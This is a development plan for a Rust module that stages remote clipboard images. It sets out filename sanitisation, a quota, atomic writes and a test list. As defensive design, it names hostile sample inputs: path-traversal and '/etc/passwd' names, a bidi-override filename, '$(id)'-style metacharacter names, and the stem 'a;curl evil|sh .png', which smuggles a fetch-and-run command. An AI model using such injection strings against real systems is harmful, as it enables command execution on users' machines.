# Phase 02 — remote staging module (filename contract, quota, atomic write)

## Context (verified against source)

- `src/server/clipboard_image.rs` (147 lines) — the existing local staging module. Keyed by TUI
  `client_id`, deliberately cross-platform. **Not** the home for this logic (predict section D).
  Relevant internals:
  - `:13-50` `stage()` — self-generates the whole filename at `:28-30`
    (`client-{client_id}-clipboard-{unique}-{attempt}.{ext}`), `create_new` at `:32` with a
    100-attempt loop, write at `:39`.
  - `:58-72` `sanitize_extension()` — **falls back to `png` on an unknown extension** (`:70`). This
    is exactly the behavior the new contract must not have.
  - `:74-80` `staging_dir()` — euid-scoped temp dir; `:82-94` `ensure_staging_dir()`;
    `:96-101` `restrict_file_options()` (0600); `:106-111` `restrict_dir_permissions()` (0700);
    `:118-134` `cleanup_stale()` — the 24h sweep, `STAGED_CLIPBOARD_IMAGE_MAX_AGE` at `:6`.
  - All of the above except `stage`/`remove_files` are module-private today.
- `src/remote/federation/sanitize.rs:40-46` — `sanitize_remote_string()`: strips C0
  (`0x00..=0x1F`), DEL (`0x7F`), C1 (`0x80..=0x9F`). **Does not** touch the bidi-control block.
- `src/remote/federation/protocol/mod.rs` — `ClipboardStageFailure` (phase 01) is the error type.
- Federation is Unix-only, but `just windows-lint` cross-compiles the whole bin for
  `x86_64-pc-windows-msvc`; anything not compile-gated must build there.

## Requirements

1. New module `src/remote/federation/file_staging.rs`, **under 200 LOC excluding tests**. Pure
   filesystem + pure functions; no protocol I/O, no `App`, no threads.
2. Public surface: one `stage_remote_clipboard_image(original_filename: &str, bytes: &[u8]) ->
   Result<PathBuf, ClipboardStageFailure>` plus a separately-testable
   `sanitize_original_filename(&str) -> Result<SanitizedFilename, ClipboardStageFailure>`.
   `stage_remote_clipboard_image` must delegate to a `pub(crate)` inner
   `stage_into(dir: &Path, original_filename: &str, bytes: &[u8])` that takes the staging directory
   **explicitly**. `staging_dir()` reads process-global `std::env::temp_dir()`
   (`clipboard_image.rs:79`), and `cargo nextest` runs tests as in-binary threads, so a per-test
   `TMPDIR` override would race sibling tests and phase 03's loopback e2e. Tests call `stage_into`
   with their own `tempdir`; only the public wrapper resolves the shared dir.
3. **Filename contract — the 8 ordered steps of predict CRITICAL-2, verbatim, in this order.** Each
   step is a named early-return; do not collapse them (the tests target them individually).
   1. reject empty, or longer than 255 bytes → `InvalidFilename`;
   2. reject any NUL byte → `InvalidFilename`;
   3. `Path::new(f).file_name()`, reject `None` → `InvalidFilename` (catches `.`, `..`, `/`);
   4. reject if the `file_name()` result differs from the input (the input contained a separator),
      and reject a leading `~` → `InvalidFilename`;
   5. strip C0/C1/DEL via `sanitize::sanitize_remote_string`, **plus** the bidi-control block
      `U+200E, U+200F, U+202A..=U+202E, U+2066..=U+2069` — not covered by C0/C1, and
      `evil<RLO>gnp.exe` renders as `evilexe.png`. Reject if the stripped form differs from the
      input (reject, do not silently rename) → `InvalidFilename`;
   5b. **reject (do not strip) any stem byte outside a conservative allowlist**:
      `[A-Za-z0-9._@+-]` plus printable non-ASCII. This rejects space, `;`, `|`, `&`, `$`, backtick,
      `'`, `"`, `(`, `)`, `<`, `>`, `*`, `?`, `\`, `!`, `#`, `{`, `}`, `[`, `]`, newline-adjacent
      punctuation, and every other shell metacharacter → `InvalidFilename`. This exists because the
      staged path is later injected into a PTY that may not have bracketed paste enabled
      (`src/pane.rs:3076-3086` sends the string raw when `input_state().bracketed_paste` is false),
      so a legal-but-hostile stem such as `a;curl evil|sh .png` would manufacture a shell-executable
      path at the other end. The client-side guard in phase 04 enforces the *same* allowlist; the two
      must agree.
   6. reject trailing dots or spaces → `InvalidFilename`;
   7. **discard any carried extension and re-derive it** from the sanitised suffix against the
      allowlist `png|jpg|jpeg|gif|webp|bmp` (case-insensitive, normalising `jpeg`→`jpg`);
      **hard `Err(UnsupportedExtension)` on a miss — never the `png` fallback**;
   8. keep the collision-proof prefix scheme so the on-disk name is never solely attacker-chosen and
      `create_new`'s uniqueness retry still holds:
      `federation-clipboard-{unique}-{attempt}-{sanitized_stem}.{derived_ext}`.
      `{unique}` is the nanosecond timestamp, as in `clipboard_image.rs:22-25`.
4. **Quota (A4):** before writing, sum the sizes of staging-dir entries **whose file name starts
   with `federation-clipboard-`**; if `existing_total + bytes.len() > 500 MiB` →
   `Err(QuotaExceeded)`. The scoping is load-bearing: `staging_dir()` is one euid-scoped directory
   shared with the local clipboard writer (`clipboard_image.rs:13-50`, no quota), so an unscoped sum
   would let purely local pastes trigger a remote `QuotaExceeded` toast. Run the existing 24h
   `cleanup_stale` sweep first so the quota is measured after eviction.
4b. **Staging-root contract — decided BEFORE any write.** The staging directory comes from
   `std::env::temp_dir()` (`clipboard_image.rs:74-80`), which is `TMPDIR`-derived and therefore
   remote-environment-controlled: on a host with `TMPDIR=/var/tmp/my staging` the write would
   succeed and return a path the phase-04 whole-path allowlist then rejects, orphaning the file and
   breaking the feature on an otherwise valid Unix box. A non-UTF-8 temp path has no lossless
   `PathBuf` → `String` contract at all (`clipboard_image.rs:38` uses `to_string_lossy`, which
   silently mangles). Therefore, immediately after `ensure_staging_dir` and before the quota scan or
   any `create_new`:
   - the resolved root must be **absolute** and `Path::to_str()` must return `Some` (lossless
     UTF-8) — no `to_string_lossy` anywhere in this module;
   - every byte of the root must satisfy the **same** whole-path allowlist phase 04 requirement 8.6
     enforces (`[A-Za-z0-9._/@+-]` plus printable non-ASCII);
   - **every candidate final path is composed and validated inside the `create_new` retry loop,
     immediately BEFORE the `OpenOptions` call for that candidate.** A rejected candidate returns
     `Err(StagingUnavailable)` without opening anything. There is **no post-write validation** — a
     check that runs after `write_all` cannot honour the no-file-on-failure contract, it can only
     orphan an artifact on the remote host;
   - any failure → `Err(ClipboardStageFailure::StagingUnavailable)` (phase 01), logged with
     `tracing::warn!` including the offending root, and **no file created**.
   The allowlist constant is shared, not re-typed: define it once in this module and have phase 04
   consume it, so the two halves cannot drift.
5. Payload size: reject `bytes.len() > MAX_CLIPBOARD_IMAGE_PAYLOAD` (`src/protocol/wire.rs:28`,
   16 MiB) → `PayloadTooLarge`. Defence in depth; phase 05 also pre-checks client-side.
6. Atomic write: `OpenOptions::new().write(true).create_new(true)` + 0600 mode, directory 0700 —
   reuse `clipboard_image.rs`'s existing helpers rather than re-deriving them.
6b. **All-or-clean write.** `create_new` only makes *creation* exclusive; it says nothing about the
   write. `write_all` (and the `flush`/`sync` that follows it) can fail part-way on ENOSPC, EIO, or a
   short write, leaving a truncated file at the candidate path — an artifact in the shared staging
   dir that violates acceptance criterion 7 and consumes quota until the 24h sweep. `stage` in
   `clipboard_image.rs:39` has exactly this hole (`file.write_all(data)?`) and must not be copied.
   Therefore, once `create_new` has succeeded, every subsequent failure on that candidate — write,
   flush, or sync — must `fs::remove_file(&path)` before returning `Err(WriteFailed)`, with the
   removal failure itself logged at `tracing::warn!` and never masking the original error. `?` is
   banned between `create_new` and the successful return; the sequence is explicit
   match-and-clean-up. (Equivalently: write to a `.partial` candidate and `fs::rename` on success —
   but the remove-on-failure form keeps the single-name/`create_new` uniqueness contract of
   requirement 3 step 8, so prefer it.)
7. Reuse, do not duplicate, the staging directory: the same euid-scoped dir the local path uses, so
   the existing 24h sweep and permissions apply unchanged (A4). **No separate `staging_dir()`
   accessor is needed and none is to be added** — `ensure_staging_dir()` already *returns* the
   resolved `PathBuf` (`clipboard_image.rs:82-94`, `Ok(dir)` at `:93`), so widening it (Files table)
   is the whole reachability story; `staging_dir()` itself stays private and its name and euid rule
   are never re-derived here.
8. Compile-gate — **the module tree is NOT Unix-gated**. Verified: `src/remote.rs:4` declares
   `pub mod federation;` unconditionally (contrast `#[cfg(unix)] mod unix;` at `:1-2`), and
   `src/main.rs:89` declares `mod remote;` unconditionally; only `federation::session` is gated
   (`src/remote/federation/mod.rs:74`). Without an explicit gate, `file_staging.rs` compiles for
   `x86_64-pc-windows-msvc`, where `restrict_file_options` is a no-op stub
   (`src/server/clipboard_image.rs:96-104`) so the 0600 guarantee silently disappears, and
   `Path::new(f).file_name()` applies Windows separator semantics. Therefore: declare it as
   `#[cfg(unix)] pub(crate) mod file_staging;` in `federation/mod.rs` **and** put
   `#![cfg(unix)]`-equivalent gating on the module body, and re-baseline `just windows-lint` before
   relying on plan.md acceptance criterion 6.
9. **Visibility contract — the module must be reachable from sibling modules outside
   `remote::federation`.** A plain `mod file_staging;` is private to `remote::federation`, and `pub`
   items inside a private module are not nameable from `crate::server::federation_accept` (phase 03
   step 4) or `crate::app::remote_clipboard_stage` (phase 04 requirement 8.6). Existing federation
   helpers already use `pub(crate)` (`sanitize.rs`). Therefore declare the module `pub(crate)` and
   mark exactly these items `pub(crate)`, nothing more:
   - `stage_remote_clipboard_image` and `stage_into` (phase 03 calls the first; tests call the
     second);
   - the shared path-allowlist predicate phase 04 consumes (requirement 4b), e.g.
     `is_injection_safe_path(&str) -> bool`, and the `federation-clipboard-` prefix constant phase
     04 requirement 8.5 checks against — phase 04 must import the constant, not retype the literal;
   - `SanitizedFilename` only if a caller needs it; otherwise keep it private.
   `sanitize_original_filename`, `staging_dir_total_bytes` and `validate_staging_path` stay private
   (tests are in-module). If `federation/mod.rs` prefers a flat surface, an explicit
   `#[cfg(unix)] pub(crate) use file_staging::{...};` re-export is equally acceptable — what is not
   acceptable is a private module with `pub` contents.

## Files

| Action | File | Owner |
|---|---|---|
| create | `src/remote/federation/file_staging.rs` | phase 02 (exclusive) |
| modify | `src/remote/federation/mod.rs` | phase 02 (exclusive) — add `#[cfg(unix)] pub(crate) mod file_staging;` (requirement 9) |
| modify | `src/server/clipboard_image.rs` | phase 02 (exclusive) — widen `ensure_staging_dir`, `cleanup_stale`, `restrict_file_options` to `pub(crate)` and document why |

Nothing else. Phase 03 consumes this module but does not edit it.

## Implementation steps

1. Widen the three helpers in `clipboard_image.rs` to `pub(crate)`, each with a one-line comment
   naming the federation staging module as the second consumer and stating that the staging
   directory, permissions, and 24h sweep are deliberately shared.
2. Write `sanitize_original_filename` as the 8 ordered steps, returning a `SanitizedFilename { stem:
   String, extension: &'static str }`. Keep each step a separate guard with its own comment
   describing the invariant (not the finding code).
3. Write `staging_dir_total_bytes(dir) -> u64` — a single `read_dir` pass summing
   `metadata().len()`, ignoring unreadable entries.
4. Write `validate_staging_path(&Path) -> Result<&str, ClipboardStageFailure>` (requirement 4b):
   absolute + `to_str()` + whole-path allowlist, returning the borrowed UTF-8 string so callers
   never reach for `to_string_lossy`. Export the allowlist predicate for phase 04.
5. Write `stage_remote_clipboard_image`: size check → `ensure_staging_dir` → **root validation** →
   `cleanup_stale` → quota check → sanitise → the 100-attempt `create_new` loop, in which each
   iteration composes its candidate path and **validates that candidate before calling
   `OpenOptions`** → `write_all` → `flush` → return the already-validated absolute `PathBuf`.
   Nothing is validated after the write; every rejection happens while the filesystem is still
   untouched. **A `write_all`/`flush` failure removes the just-created candidate before returning
   (requirement 6b)** — that is the only filesystem state this module can leave behind, and it must
   not. `stage_into` runs the identical sequence against the caller-supplied dir, so the tests
   exercise the real ordering. Add a `stage_into` seam for injecting a failing writer (the same shape
   as test 12b's validator seam) so the failure branch is deterministically reachable in CI.
6. Map every `io::Error` to `ClipboardStageFailure::WriteFailed`; log the real error with
   `tracing::warn!` (no `unwrap()` anywhere; the real error never crosses the wire). Base64 decoding
   is **not** this module's job: phase 03 decodes and maps a malformed payload to `InvalidPayload`
   before calling in here, so this module never sees an undecodable payload and never reports one as
   a write failure.

## Tests — TESTS FIRST

Every starred test is net-new surface and must be written and failing before the implementation step
it guards (1-6 and 11 before step 2; 12, 12b and 13 before step 5).

1. ★`stage_rejects_path_traversal_in_original_filename` — `"../../.ssh/authorized_keys"` →
   `Err(InvalidFilename)`; assert nothing was written outside the staging dir.
2. ★`stage_rejects_absolute_path_filename` — `"/etc/passwd"` → `Err(InvalidFilename)`.
3. ★`stage_rejects_null_byte_in_filename` — `"a\0b.png"` → `Err(InvalidFilename)`.
4. ★`stage_rejects_or_strips_bidi_override_in_filename` — `"evil\u{202E}gnp.exe"` →
   `Err(InvalidFilename)`. Explicitly asserts the result is a rejection, not a rename to
   `evilexe.png`.
5. ★`stage_rejects_unknown_extension_instead_of_png_fallback` — `"payload.sh"` →
   `Err(UnsupportedExtension)`, and assert no `.png` file appeared in the staging dir (this is the
   direct contrast with `clipboard_image.rs:70`).
6. ★`stage_rejects_oversized_filename` — a 300-byte name → `Err(InvalidFilename)`.

Non-starred, same phase:

7. `stage_preserves_the_original_filename_stem_behind_a_collision_proof_prefix` — `"diagram.PNG"`
   stages as `federation-clipboard-{...}-diagram.png`; the stem survives, the prefix is present, the
   extension is normalised.
8. `stage_rejects_a_payload_over_the_image_size_limit` → `PayloadTooLarge`.
9. `stage_rejects_a_write_that_would_exceed_the_staging_directory_quota` → `QuotaExceeded`; call
   `stage_into` with a `tempdir` (never a `TMPDIR` override — see requirement 2) and pre-populate it
   with `federation-clipboard-`-prefixed files. Add a sibling assertion that non-prefixed files in
   the same dir do **not** count toward the quota.
10. `staged_file_is_created_exclusively_with_owner_only_permissions` — `#[cfg(unix)]`, asserting the
    resulting file mode (0600) and the directory mode (0700).
11. ★`stage_rejects_shell_metacharacters_in_original_filename` — table over `"a;b.png"`,
    `"a b.png"`, `"$(id).png"`, `` "`id`.png" ``, `"a|b.png"`, `"a&b.png"`, `"a>b.png"` → all
    `Err(InvalidFilename)`; assert nothing was written. This is the source-side half of the
    injection guard whose client-side half is phase 04.
12. ★`stage_rejects_a_staging_root_that_is_not_injection_safe` — call `stage_into` with a `tempdir`
    child whose name contains a space, then one containing `;`, then a relative path →
    `Err(StagingUnavailable)` every time, **and assert no file was created in that directory**. This
    is the test that proves the rejection happens before the write, not after it.
13. ★`stage_rejects_a_staging_root_that_is_not_lossless_utf8` — `#[cfg(unix)]`, build the root with
    `OsStr::from_bytes(&[0xff])` via `std::os::unix::ffi::OsStrExt` → `Err(StagingUnavailable)`,
    nothing written, and no `to_string_lossy` substitution reaches the return value.
12b. ★`a_rejected_candidate_final_path_leaves_no_file_on_disk` — the ordering proof for requirement
    4b. Drive `stage_into` against a root that is itself allowlist-clean but whose *composed*
    candidate path the predicate rejects (inject the rejection through the same candidate-validation
    seam the loop uses, e.g. a `stage_into_with_validator` variant or a root at exactly the length
    that trips the check), then assert: `Err(StagingUnavailable)`, `read_dir` of the staging dir is
    **empty**, and no file with the `federation-clipboard-` prefix exists anywhere under it. A
    post-write validation implementation fails this test; a pre-`create_new` one passes. Without
    this test the "validate before write" contract is unenforced, because test 12 only covers the
    root.
12c. ★`a_failed_write_leaves_no_partial_file_on_disk` — requirement 6b's guard, and the second half of
    acceptance criterion 7 (12b covers pre-write rejection; this covers post-`create_new` failure).
    Drive `stage_into` through the injectable-writer seam with a writer that fails after N bytes
    (deterministic, no ENOSPC simulation needed), then assert: `Err(WriteFailed)`, and `read_dir` of
    the staging dir contains **no** entry whose name starts with `federation-clipboard-`. An
    implementation that propagates the write error with `?` leaves a truncated file and fails this
    test. Pair with a positive control in the same test: the same fixture with a working writer does
    leave exactly one prefixed file.
14. `staged_path_returned_to_the_client_satisfies_the_shared_path_allowlist` — a successful
    `stage_into` against a safe tempdir; assert the returned path passes the exact predicate phase 04
    applies, so the two halves are proven to agree in-tree rather than by inspection.

## Risks and rollback

- **Risk:** tests that touch the shared euid-scoped staging dir interfere with each other or with a
  live Herdr. Mitigated structurally by the `stage_into(dir, ..)` seam (requirement 2), not by
  environment mutation — `TMPDIR` is process-global and nextest runs threads in-process.
- **Risk:** step 5's "reject if stripped ≠ input" makes legitimate non-ASCII filenames fail. It does
  not — `sanitize_remote_string` preserves all printable non-ASCII; only controls and the bidi block
  are removed. Test 7 with a non-ASCII stem if in doubt.
- **Risk:** widening three helpers to `pub(crate)` invites future misuse. The doc comments name the
  single intended second consumer.
- **Rollback:** the new module has no call sites until phase 03; revert the commit and restore the
  three `fn` visibilities.
